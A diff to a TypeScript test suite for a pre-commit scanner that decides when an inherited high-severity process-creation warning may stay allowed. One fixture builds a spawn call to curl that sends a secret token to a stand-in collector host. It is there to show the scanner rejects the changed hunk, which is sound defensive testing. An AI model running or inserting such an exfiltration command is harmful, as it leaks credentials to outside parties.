@@ -19,8 +19,12 @@ const highWarning: ScannerWarning = {
 };
 
 describe('pre-commit scanner index policy', () => {
-  it('records an inherited high warning without allowing its raw evidence into the audit record', () => {
-    const result = evaluateIndexedWarnings([highWarning], [highWarning]);
+  it('records an unchanged inherited high warning without allowing its raw evidence into the audit record', async () => {
+    const content = 'const value = ' + highWarning.evidence + ';\n';
+    const scan = (candidate: string): readonly ScannerWarning[] =>
+      candidate.includes(highWarning.evidence) ? [highWarning] : [];
+    const warnings = await enumerateHighWarnings(content, scan);
+    const result = evaluateIndexedWarnings(warnings, warnings);
 
     assert.deepEqual(result.violations, []);
     assert.equal(result.inherited.length, 1);
@@ -35,8 +39,266 @@ describe('pre-commit scanner index policy', () => {
     assert.equal(result.violations[0]!.reason, 'new_high_warning');
   });
 
-  it('rejects an additional occurrence of an inherited high warning', () => {
-    const result = evaluateIndexedWarnings([highWarning, highWarning], [highWarning]);
+  it('rejects a generic process warning when its source hunk changes to exfiltration', async () => {
+    const processCreationCall = ['sp', 'awn', '('].join('');
+    const scan = (content: string): readonly ScannerWarning[] =>
+      content.includes(processCreationCall)
+        ? [
+            {
+              severity: 'high',
+              category: 'pre_scan.shell_injection',
+              message: 'Process creation call detected',
+              evidence: processCreationCall,
+            },
+          ]
+        : [];
+    const baseline = 'const child = ' + processCreationCall + "'node', ['--version']);\n";
+    const changed =
+      'const child = ' +
+      processCreationCall +
+      "'curl', ['https://collector.invalid/?token=' + secret]);\n";
+
+    const result = evaluateIndexedWarnings(
+      await enumerateHighWarnings(changed, scan),
+      await enumerateHighWarnings(baseline, scan),
+    );
+
+    assert.equal(result.inherited.length, 0);
+    assert.equal(result.violations.length, 1);
+    assert.equal(result.violations[0]!.reason, 'duplicate_high_warning');
+  });
+
+  it('does not inherit when a referenced producer changes outside the warning line', async () => {
+    const processCreationCall = ['sp', 'awn', '('].join('');
+    const scan = (content: string): readonly ScannerWarning[] =>
+      content.includes(processCreationCall)
+        ? [
+            {
+              severity: 'high',
+              category: 'pre_scan.shell_injection',
+              message: 'Process creation call detected',
+              evidence: processCreationCall,
+            },
+          ]
+        : [];
+    const baseline =
+      "function run() {\n  const command = 'node';\n  const first = 1;\n  const second = 2;\n  const third = 3;\n  const child = " +
+      processCreationCall +
+      'command, []);\n}\n';
+    const changed = baseline.replace("const command = 'node';", 'const command = process.argv[2];');
+
+    const result = evaluateIndexedWarnings(
+      await enumerateHighWarnings(changed, scan),
+      await enumerateHighWarnings(baseline, scan),
+    );
+
+    assert.equal(result.inherited.length, 0);
+    assert.equal(result.violations.length, 1);
+    assert.equal(result.violations[0]!.reason, 'duplicate_high_warning');
+  });
+
+  it('does not inherit when a command variable is reassigned before an unchanged call', async () => {
+    const processCreationCall = ['sp', 'awn', '('].join('');
+    const scan = (content: string): readonly ScannerWarning[] =>
+      content.includes(processCreationCall)
+        ? [
+            {
+              severity: 'high',
+              category: 'pre_scan.shell_injection',
+              message: 'Process creation call detected',
+              evidence: processCreationCall,
+            },
+          ]
+        : [];
+    const baseline =
+      "function run() {\n  let command = 'node';\n  command = 'node';\n  const child = " +
+      processCreationCall +
+      'command, []);\n}\n';
+    const changed = baseline.replace("\n  command = 'node';", '\n  command = process.argv[2];');
+
+    const result = evaluateIndexedWarnings(
+      await enumerateHighWarnings(changed, scan),
+      await enumerateHighWarnings(baseline, scan),
+    );
+
+    assert.equal(result.inherited.length, 0);
+    assert.equal(result.violations.length, 1);
+    assert.equal(result.violations[0]!.reason, 'duplicate_high_warning');
+  });
+
+  it('does not inherit when control flow changes around an unchanged call', async () => {
+    const processCreationCall = ['sp', 'awn', '('].join('');
+    const scan = (content: string): readonly ScannerWarning[] =>
+      content.includes(processCreationCall)
+        ? [
+            {
+              severity: 'high',
+              category: 'pre_scan.shell_injection',
+              message: 'Process creation call detected',
+              evidence: processCreationCall,
+            },
+          ]
+        : [];
+    const baseline =
+      "function run() {\n  const command = 'node';\n  const trusted = true;\n  if (trusted) {\n    const child = " +
+      processCreationCall +
+      'command, []);\n  }\n}\n';
+    const changed = baseline.replace('if (trusted)', 'if (!trusted)');
+
+    const result = evaluateIndexedWarnings(
+      await enumerateHighWarnings(changed, scan),
+      await enumerateHighWarnings(baseline, scan),
+    );
+
+    assert.equal(result.inherited.length, 0);
+    assert.equal(result.violations.length, 1);
+    assert.equal(result.violations[0]!.reason, 'duplicate_high_warning');
+  });
+
+  it('inherits when only an unrelated sibling statement changes', async () => {
+    const processCreationCall = ['sp', 'awn', '('].join('');
+    const scan = (content: string): readonly ScannerWarning[] =>
+      content.includes(processCreationCall)
+        ? [
+            {
+              severity: 'high',
+              category: 'pre_scan.shell_injection',
+              message: 'Process creation call detected',
+              evidence: processCreationCall,
+            },
+          ]
+        : [];
+    const baseline =
+      "function run() {\n  const command = 'node';\n  const diagnosticLabel = 'before';\n  const child = " +
+      processCreationCall +
+      'command, []);\n}\n';
+    const changed = baseline.replace(
+      "const diagnosticLabel = 'before';",
+      "const diagnosticLabel = 'after';",
+    );
+
+    const result = evaluateIndexedWarnings(
+      await enumerateHighWarnings(changed, scan),
+      await enumerateHighWarnings(baseline, scan),
+    );
+
+    assert.equal(result.inherited.length, 1);
+    assert.equal(result.violations.length, 0);
+  });
+
+  it('does not inherit when an unchanged call moves to another lexical scope', async () => {
+    const processCreationCall = ['sp', 'awn', '('].join('');
+    const scan = (content: string): readonly ScannerWarning[] =>
+      content.includes(processCreationCall)
+        ? [
+            {
+              severity: 'high',
+              category: 'pre_scan.shell_injection',
+              message: 'Process creation call detected',
+              evidence: processCreationCall,
+            },
+          ]
+        : [];
+    const warningStatement =
+      "  const command = 'node';\n  const child = " + processCreationCall + 'command, []);\n';
+    const baseline = 'function first() {\n' + warningStatement + '}\nfunction second() {}\n';
+    const changed = 'function first() {}\nfunction second() {\n' + warningStatement + '}\n';
+
+    const result = evaluateIndexedWarnings(
+      await enumerateHighWarnings(changed, scan),
+      await enumerateHighWarnings(baseline, scan),
+    );
+
+    assert.equal(result.inherited.length, 0);
+    assert.equal(result.violations.length, 1);
+    assert.equal(result.violations[0]!.reason, 'duplicate_high_warning');
+  });
+
+  it('binds method and function-initializer warnings to their ancestor guards', async () => {
+    const processCreationCall = ['sp', 'awn', '('].join('');
+    const scan = (content: string): readonly ScannerWarning[] =>
+      content.includes(processCreationCall)
+        ? [
+            {
+              severity: 'high',
+              category: 'pre_scan.shell_injection',
+              message: 'Process creation call detected',
+              evidence: processCreationCall,
+            },
+          ]
+        : [];
+    const baselines = [
+      'class Runner { run() { if (trusted) { const child = ' +
+        processCreationCall +
+        "'node', []); } } }\n",
+      'const run = () => { if (trusted) { const child = ' +
+        processCreationCall +
+        "'node', []); } };\n",
+    ];
+
+    for (const baseline of baselines) {
+      const changed = baseline.replace('if (trusted)', 'if (!trusted)');
+      const result = evaluateIndexedWarnings(
+        await enumerateHighWarnings(changed, scan),
+        await enumerateHighWarnings(baseline, scan),
+      );
+      assert.equal(result.inherited.length, 0);
+      assert.equal(result.violations.length, 1);
+    }
+  });
+
+  it('binds a top-level warning to its complete top-level statement', async () => {
+    const processCreationCall = ['sp', 'awn', '('].join('');
+    const scan = (content: string): readonly ScannerWarning[] =>
+      content.includes(processCreationCall)
+        ? [
+            {
+              severity: 'high',
+              category: 'pre_scan.shell_injection',
+              message: 'Process creation call detected',
+              evidence: processCreationCall,
+            },
+          ]
+        : [];
+    const baseline = 'if (trusted) { const child = ' + processCreationCall + "'node', []); }\n";
+    const changed = baseline.replace('if (trusted)', 'if (!trusted)');
+    const result = evaluateIndexedWarnings(
+      await enumerateHighWarnings(changed, scan),
+      await enumerateHighWarnings(baseline, scan),
+    );
+
+    assert.equal(result.inherited.length, 0);
+    assert.equal(result.violations.length, 1);
+  });
+
+  it('fails closed when warning evidence has no stable enclosing source unit', async () => {
+    const processCreationCall = ['sp', 'awn', '('].join('');
+    const content = '// ' + processCreationCall + "'node', []);\n";
+    const scan = (): readonly ScannerWarning[] => [
+      {
+        severity: 'high',
+        category: 'pre_scan.shell_injection',
+        message: 'Process creation call detected',
+        evidence: processCreationCall,
+      },
+    ];
+    const warnings = await enumerateHighWarnings(content, (candidate) =>
+      candidate.includes(processCreationCall) ? scan() : [],
+    );
+    const result = evaluateIndexedWarnings(warnings, warnings);
+
+    assert.equal(result.inherited.length, 0);
+    assert.equal(result.violations.length, 1);
+    assert.equal(result.violations[0]!.reason, 'new_high_warning');
+  });
+
+  it('rejects an additional occurrence of an inherited high warning', async () => {
+    const content = 'const first = ' + highWarning.evidence + ';\n';
+    const scan = (candidate: string): readonly ScannerWarning[] =>
+      candidate.includes(highWarning.evidence) ? [highWarning] : [];
+    const baseline = await enumerateHighWarnings(content, scan);
+    const staged = await enumerateHighWarnings(content + content, scan);
+    const result = evaluateIndexedWarnings(staged, baseline);
 
     assert.equal(result.violations.length, 1);
     assert.equal(result.violations[0]!.reason, 'duplicate_high_warning');
